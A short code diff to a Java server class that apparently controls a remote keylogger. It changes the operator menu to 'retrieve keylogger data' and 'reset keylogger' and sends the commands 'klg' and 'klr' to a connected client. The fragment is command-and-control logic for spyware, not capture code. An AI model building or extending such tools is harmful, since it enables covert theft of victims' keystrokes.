@@ -86,15 +86,14 @@ public class Server implements Runnable {
                 if (command.equals("keylogger")) {
                     System.out.println("keylogging module initiated");
                     System.out.println("Select Option:");
-                    System.out.println("0 - start keylogger");
-                    System.out.println("1 - stop keylogger");
-                    System.out.println("2 - retrieve keypresses");
+                    System.out.println("0 - retrieve keylogger data");
+                    System.out.println("1 - reset keylogger");
                     int choice = Keyboard.readInt();
                     if (choice==0) {
+                        ps.println("klg");
                         
                     } else if (choice==1) {
-                        
-                    } else if (choice==2) {
+                        ps.println("klr");
                         
                     }
                 }
